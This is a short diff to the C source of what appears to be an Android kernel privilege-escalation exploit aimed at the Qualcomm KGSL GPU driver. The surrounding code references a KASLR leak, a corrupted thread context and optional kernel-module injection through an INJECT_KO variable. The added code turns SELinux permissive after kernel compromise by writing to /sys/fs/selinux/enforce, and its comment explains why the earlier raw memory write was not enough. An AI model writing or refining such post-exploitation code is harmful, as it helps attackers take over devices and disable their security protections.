@@ -1184,6 +1184,8 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
     }
     if (ctrls[idx].daemon_abort) _exit(127);
 
+    setenforce_permissive();
+
     if (getenv("INJECT_KO")) {
         const char *ko = getenv("INJECT_KO");
         printf("[*] init_module(%s)\n", ko);
@@ -2052,6 +2054,23 @@ static int sec_read_enforce(void) {
     close(fd);
     if (n <= 0) return -1;
     return value[0] == '0' ? 0 : 1;
+}
+
+/*
+ * The raw thread.cpu_context store only flips selinux_state.enforcing; init
+ * and the property service cache their own AVC enforcing state and never see
+ * it.  Writing the selinuxfs enforce node goes through security_setenforce(),
+ * which updates the status page and broadcasts the AVC netlink event.
+ */
+static void setenforce_permissive(void) {
+    int fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
+    if (fd < 0) {
+        fprintf(stderr, "[-] selinuxfs setenforce: %s\n", strerror(errno));
+        return;
+    }
+    if (write(fd, "0", 1) != 1)
+        fprintf(stderr, "[-] selinuxfs setenforce: %s\n", strerror(errno));
+    close(fd);
 }
 
 static void sec_report_permissive(uint64_t kaslr, pid_t pid) {
